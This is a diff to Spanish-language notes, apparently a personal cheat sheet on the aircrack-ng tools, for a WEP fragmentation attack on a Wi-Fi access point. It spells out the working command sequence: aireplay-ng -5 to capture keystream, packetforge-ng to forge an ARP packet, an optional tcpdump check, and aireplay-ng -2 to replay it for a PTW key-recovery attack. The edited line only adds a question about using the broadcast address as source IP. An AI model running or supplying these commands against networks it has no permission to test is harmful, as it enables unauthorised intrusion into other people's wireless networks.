@@ -102,7 +102,7 @@ Fragmentation Attack
 ----------------------
 (Espera un paquete, y cuando lo recibe comienza el ataque. Hace falta que la MAC usada esté asociada al AP. Hace falta estar razonablemente cerca del AP para que no falte ningún paquete)
 aireplay-ng -5 -b MAC-AP -h MAC-NUESTRA mon0
-packetforge-ng -0 (crear un ARP packet) -a MAP-AP -h NUESTRA-MAC -l SOURCE-IP -k BROADCAST-IP (o cualquier IP no asignada) -y .XOR-FILE -w DEST-FILENAME
+packetforge-ng -0 (crear un ARP packet) -a MAP-AP -h NUESTRA-MAC -l SOURCE-IP (vale la broadcast¿?) -k BROADCAST-IP (o cualquier IP no asignada) -y .XOR-FILE -w DEST-FILENAME
 OPCIONAL tcpdump -n -vvv -e -s0 -r DEST-FILENAME-ANTERIOR
 aireplay-ng -2 (PTW Attack) -r DEST-FILENAME-ANTERIOR mon0
 
